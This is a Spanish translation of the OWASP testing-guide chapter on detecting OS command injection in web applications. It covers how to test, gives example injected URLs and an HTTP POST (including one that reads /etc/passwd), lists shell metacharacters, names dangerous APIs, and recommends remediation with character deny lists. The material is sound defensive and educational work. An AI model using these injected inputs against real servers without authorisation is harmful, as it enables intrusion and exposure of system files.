# Prueba de inyección de comandos

|ID          |
|------------|
|WSTG-INPV-12|

## Resumen

Este artículo describe cómo probar una aplicación para detectar inyección de comandos del sistema operativo. El evaluador intentará inyectar un comando del sistema operativo a través de una solicitud HTTP a la aplicación.

La inyección de comandos del sistema operativo es una técnica utilizada a través de una interfaz web para ejecutar comandos del sistema operativo en un servidor web. El usuario proporciona comandos del sistema operativo a través de una interfaz web para ejecutar comandos del sistema operativo. Cualquier interfaz web que no esté debidamente sanitizada está sujeta a esta explotación. Con la capacidad de ejecutar comandos del sistema operativo, el usuario puede cargar programas maliciosos o incluso obtener contraseñas. La inyección de comandos del sistema operativo es prevenible cuando se enfatiza la seguridad durante el diseño y desarrollo de aplicaciones.

## Objetivos de la prueba

- Identificar y evaluar los puntos de inyección de comandos.

## Cómo probar

Al ver un archivo en una aplicación web, el nombre del archivo a menudo se muestra en la URL. Perl permite canalizar datos desde un proceso a una declaración abierta. El usuario puede simplemente añadir el símbolo de canalización `|` al final del nombre del archivo.

URL de ejemplo antes de la alteración:

`https://sensitive/cgi-bin/userData.pl?doc=user1.txt`

URL de ejemplo modificada:

`https://sensitive/cgi-bin/userData.pl?doc=/bin/ls|`

Esto ejecutará el comando `/bin/ls`.

Añadiendo un punto y coma al final de una URL para una página .PHP seguido de un comando del sistema operativo, ejecutará el comando. `%3B` está codificado en URL y se decodifica a punto y coma

Ejemplo:

`https://sensitive/something.php?dir=%3Bcat%20/etc/passwd`

### Ejemplo

Considere el caso de una aplicación que contiene un conjunto de documentos que puede navegar desde Internet. Si inicia un proxy personal (como ZAP o Burp Suite), puede obtener un POST HTTP como el siguiente (`https://www.example.com/public/doc`):

```txt
POST /public/doc HTTP/1.1
Host: www.example.com
[...]
Referer: https://127.0.0.1/WebGoat/attack?Screen=20
Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5
Authorization: Basic T2Vbc1Q9Z3V2Tc3e=
Content-Type: application/x-www-form-urlencoded
Content-length: 33

Doc=Doc1.pdf
```

En esta solicitud post, notamos cómo la aplicación recupera la documentación pública. Ahora podemos probar si es posible añadir un comando del sistema operativo para inyectar en el POST HTTP. Pruebe lo siguiente (`https://www.example.com/public/doc`):

```txt
POST /public/doc HTTP/1.1
Host: www.example.com
[...]
Referer: https://127.0.0.1/WebGoat/attack?Screen=20
Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5
Authorization: Basic T2Vbc1Q9Z3V2Tc3e=
Content-Type: application/x-www-form-urlencoded
Content-length: 33

Doc=Doc1.pdf+|+Dir c:\
```

Si la aplicación no valida la solicitud, podemos obtener el siguiente resultado:

```txt
    Exec Results for 'cmd.exe /c type "C:\httpd\public\doc\"Doc=Doc1.pdf+|+Dir c:\'
    Output...
    Il volume nell'unità C non ha etichetta.
    Numero di serie Del volume: 8E3F-4B61
    Directory of c:\
     18/10/2006 00:27 2,675 Dir_Prog.txt
     18/10/2006 00:28 3,887 Dir_ProgFile.txt
     16/11/2006 10:43
        Doc
        11/11/2006 17:25
           Documents and Settings
           25/10/2006 03:11
              I386
              14/11/2006 18:51
             h4ck3r
             30/09/2005 21:40 25,934
            OWASP1.JPG
            03/11/2006 18:29
                Prog
                18/11/2006 11:20
                    Program Files
                    16/11/2006 21:12
                        Software
                        24/10/2006 18:25
                            Setup
                            24/10/2006 23:37
                                Technologies
                                18/11/2006 11:14
                                3 File 32,496 byte
                                13 Directory 6,921,269,248 byte disponibili
                                Return code: 0
```

En este caso, hemos realizado exitosamente un ataque de inyección del sistema operativo.

## Caracteres especiales para inyección de comandos

Los siguientes caracteres especiales se pueden usar para inyección de comandos como `|` `;` `&` `$` `>` `<` `'` `!`

- `cmd1|cmd2` : El uso de `|` hará que el comando 2 se ejecute independientemente de si la ejecución del comando 1 es exitosa o no.
- `cmd1;cmd2` : El uso de `;` hará que el comando 2 se ejecute independientemente de si la ejecución del comando 1 es exitosa o no.
- `cmd1||cmd2` : El comando 2 solo se ejecutará si la ejecución del comando 1 falla.
- `cmd1&&cmd2` : El comando 2 solo se ejecutará si la ejecución del comando 1 tiene éxito.
- `$(cmd)` : Por ejemplo, `echo $(whoami)` o `$(touch test.sh; echo 'ls' > test.sh)`
- `cmd` : Se usa para ejecutar un comando específico. Por ejemplo, `whoami`
- `>(cmd)`: `>(ls)`
- `<(cmd)`: `<(ls)`

## Revisión de código API peligrosas

Tenga en cuenta el uso de las siguientes API ya que pueden introducir riesgos de inyección de comandos.

### Java

- `Runtime.exec()`

### C/C++

- `system`
- `exec`
- `ShellExecute`

### Python

- `exec`
- `eval`
- `os.system`
- `os.popen`
- `subprocess.popen`
- `subprocess.call`

### PHP

- `system`
- `shell_exec`
- `exec`
- `proc_open`
- `eval`

## Remediation

### Sanitización

La URL y los datos del formulario necesitan ser sanitizados para caracteres inválidos. Una lista de denegación de caracteres es una opción pero puede ser difícil pensar en todos los caracteres contra los que validar. También puede haber algunos que no se hayan descubierto aún. Se debe crear una lista de permisos que contenga solo caracteres permitidos o lista de comandos para validar la entrada del usuario. Los caracteres que se pasaron por alto, así como amenazas no descubiertas, deben ser eliminados por esta lista.

La lista de denegación general a incluir para inyección de comandos puede ser `|` `;` `&` `$` `>` `<` `'` `\` `!` `>>` `#`

Escapar o filtrar caracteres especiales para windows,   `(` `)` `<` `>` `&` `*` `‘` `|` `=` `?` `;` `[` `]` `^` `~` `!` `.` `"` `%` `@` `/` `\` `:` `+` `,`  ``` ` ```
Escapar o filtrar caracteres especiales para Linux, `{` `}` `(` `)` `>` `<` `&` `*` `‘` `|` `=` `?` `;` `[` `]` `$` `–` `#` `~` `!` `.` `"` `%`  `/` `\` `:` `+` `,` ``` ` ```

### Permisos

La aplicación web y sus componentes deben ejecutarse bajo permisos estrictos que no permitan la ejecución de comandos del sistema operativo. Intente verificar toda esta información para probar desde un punto de vista de prueba de caja gris.

## Herramientas

- OWASP [WebGoat](https://owasp.org/www-project-webgoat/)
- [Commix](https://github.com/commixproject/commix)

## Referencias

- [Penetration Testing for Web Applications (Part Two)](https://www.symantec.com/connect/articles/penetration-testing-web-applications-part-two)
- [CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](https://cwe.mitre.org/data/definitions/78.html)
- [ENV33-C. Do not call system()](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=87152177)